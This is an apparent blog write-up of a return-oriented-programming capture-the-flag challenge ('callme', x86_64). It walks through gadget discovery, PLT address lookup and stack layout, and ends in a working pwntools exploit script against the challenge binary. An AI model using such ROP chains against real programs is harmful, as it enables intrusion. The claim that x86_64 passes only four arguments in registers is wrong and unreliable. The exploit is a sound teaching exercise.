
---
layout: post
title: ROP x64 Challenge 3
status: in progress
type: post
published: true
comments: true
date: 2022-07-13
---
## Challenge 3

With the first real ROP challenge completed, let's start getting into some of the fun stuff. While unintended gadgets are super fun to play with, it's also super useful to be able to call intended functions and that is what this challenge deals with. 

Before we go into the challenge, let's take a quick look at how function arguments are passed from caller to callie which is actually system dependent. In x86_64, both the stack and the registers are used, but in practice it's really just the registers. The first 4 arguments are placed in registers, then the rest are pushed onto the stack before the call.

| 64-bit register | 32-bit sub-register | 16-bit sub-register | 8-bit sub-register | Notes               |
| --------------- | ------------------- | ------------------- | ------------------ | ------------------- |
| %rcx            | %ecx                | %cx                 | %cl                | Counter & 4th arg   |
| %rdx            | %edx                | %dx                 | %dl                | 3rd arg             |
| %rsi            | %esi                | %si                 | %sil               | 2nd arg             |
| %rdi            | %edi                | %di                 | %dil               | 1st call argument |

So, if we have the following function:

```C
int foo(int var1, int var2, int var3){
	stuff
}
```

and we wanted to call the function as `foo(1,2,3);` then we would have to place 1 in rdi, 2 in rsi, and 3 in rdx.

With that background covered, let's look at the challenge:

> You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, ~~each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag~~. ==**For the x86_64 binary** double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`==

First things first, let's just focus on doing it for callme_one. We need to find gadgets that will let us control the values of rdi, rsi, and rdx. The simplest way is to pop them off the stack because we already control that. So let's search for pop rdi in the binary.

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/callme/callme_64/callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
0x00000000004009a3: pop rdi; ret; 

```


Will you look at that, that's super useful (it's also there intentionally, hint `disass usefulGagets`).

With that gadget we can set all of the arguments to the callme functions.

```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | # fill the buffer and base pointer
8  bytes | pop gadget loc | # call 1st gadget to pop off all the vals
8  bytes | 0xdeadbeef...  | # all of the function arguments
8  bytes | 0xcafebabe...  |
8  bytes | 0xd00df00d...  |
8  bytes | callme_1 loc   | # call the first call me function
8  bytes | pop gadget loc | # start again, and call the pop off gadget
8  bytes | 0xdeadbeef...  | # function args again
8  bytes | 0xcafebabe...  |
8  bytes | 0xd00df00d...  |
8  bytes | callme_2 loc   | # call the sec call me function
8  bytes | pop gadget loc | # start again for the last time
8  bytes | 0xdeadbeef...  |
8  bytes | 0xcafebabe...  |
8  bytes | 0xd00df00d...  |
8  bytes | callme_3 loc   | # final call of call me
8  bytes | -------------- |

```

There's just one last thing that we don't know, what values to place into the stack for the callme functions. To do this, we can use the rabin2 tool from before:
```
rabin2 -i callme
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       puts
2   0x004006e0 GLOBAL FUNC       printf
3   0x004006f0 GLOBAL FUNC       callme_three
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00400720 GLOBAL FUNC       callme_one
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x00400730 GLOBAL FUNC       setvbuf
10  0x00400740 GLOBAL FUNC       callme_two
11  0x00400750 GLOBAL FUNC       exit
```

And we are able to get the locations of the callme functions. An important note is that these are in the plt (Procedure Linkage Table), not actually the callme binary. That won't matter for this challenge, but we will have to deal with the plt and how linked binaries work later on.

At this point we have all of the values that we want to put on the stack, so it's just a question of coding up an exploit in python with our trusty pwntools.

```python
#!/usr/bin/python3

from pwn import *
io = process('./callme')

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

# This is the vaddr of system
# First return to the location of the pop rdi
popper = p64(0x0040093c)
call1 = p64(0x00400720)
call2 = p64(0x00400740)
call3 = p64(0x004006f0)

back_junk = b"B" * 20

newbp    = p32(0xba5effff) * 2

d00df00d = p32(0xd00df00d) * 2
deadbeef = p32(0xdeadbeef) * 2
cafebabe = p32(0xcafebabe) * 2

args = deadbeef + cafebabe + d00df00d 

payload = junk + newbp + popper + args +call1 + popper + args + call2 + popper + args + call3

print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))

io.send(payload)

input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))

sleep(1)

```

